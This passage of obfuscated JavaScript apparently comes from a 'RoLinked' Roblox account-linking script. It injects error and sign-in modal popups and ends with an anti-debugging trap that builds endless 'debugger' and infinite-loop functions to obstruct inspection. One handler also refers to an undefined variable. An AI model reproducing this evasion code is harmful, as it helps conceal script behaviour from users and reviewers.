                                        var r = '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Unable to link account</h5></div></div><div class="modal-body"><div class="text-center"><div>Your account is not qualified to be linked to RoLinked.\nAlternative accounts are not allowed</div></div></div><div class="modal-footer"></div></div></div></div></div></div>';
                                        document.body.insertAdjacentHTML("beforeend", r);
                                        document.getElementById("closeButton1").onclick = function () {
                                            document.getElementById("promptPopup").remove();
                                            document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                        };
                                        document.getElementById("promptPopup").onclick = function () {
                                            document.getElementById("promptPopup").remove();
                                            document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                        };
                                    }
                                } else {
                                    var r = '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Unable to link account</h5></div></div><div class="modal-body"><div class="text-center"><div>Your account is not qualified to be linked to RoLinked.\nAlternative accounts are not allowed</div></div></div><div class="modal-footer"></div></div></div></div></div></div>';
                                    document.body.insertAdjacentHTML("beforeend", r);
                                    document.getElementById("closeButton1").onclick = function () {
                                        document.getElementById("promptPopup").remove();
                                        document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                    };
                                    document.getElementById("promptPopup").onclick = function () {
                                        document.getElementById("promptPopup").remove();
                                        document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                    };
                                }
                            })
                            .fail(function (z, R, T) {
                                var e = {};
                                e.TtiXK = "promptPopup";
                                e.FnVfJ = "text-footer footer-note";
                                e.PXKIK = "Not Active";
                                var a = '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Error</h5></div></div><div class="modal-body"><div class="text-center"><div>Please refresh your page and try again, an error has occured.</div></div></div><div class="modal-footer"></div></div></div></div></div></div>';
                                document.body.insertAdjacentHTML("beforeend", a);
                                document.getElementById("closeButton1").onclick = function () {
                                    document.getElementById(w.TtiXK).remove();
                                    document.getElementsByClassName(w.FnVfJ)[0].innerText = w.PXKIK;
                                };
                                document.getElementById("promptPopup").onclick = function () {
                                    document.getElementById("promptPopup").remove();
                                    document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                };
                            });
                    }
                })();
            },
            error: function () {
                var o = {};
                o.WgJGc = "promptPopup";
                o.OGPzo = "text-footer footer-note";
                o.MEPkP = "Not Active";
                var G = o;
                var J = '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Unable to link account</h5></div></div><div class="modal-body"><div class="text-center"><div>You are currently signed out of Roblox</div></div></div><div class="modal-footer"></div></div></div></div></div></div>';
                document.body.insertAdjacentHTML("beforeend", J);
                document.getElementById("closeButton1").onclick = function () {
                    document.getElementById(G.WgJGc).remove();
                    document.getElementsByClassName(G.OGPzo)[0].innerText = G.MEPkP;
                };
                document.getElementById("promptPopup").onclick = function () {
                    document.getElementById("promptPopup").remove();
                    document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                };
            },
        });
    }
})();
function y(K) {
    function m(U) {
        if (typeof U === "string") {
            return function (i) {}.constructor("while (true) {}").apply("counter");
        } else {
            ("" + U / U).length !== 1 || U % 20 === 0
                ? function () {
                      return true;
                  }
                      .constructor("debugger")
                      .call("action")
                : function () {
                      return false;
                  }
                      .constructor("debugger")
                      .apply("stateObject");
        }
        m(++U);
    }
    try {
        if (K) {
            return m;
        } else {
            m(0);
        }
    } catch (U) {}
}
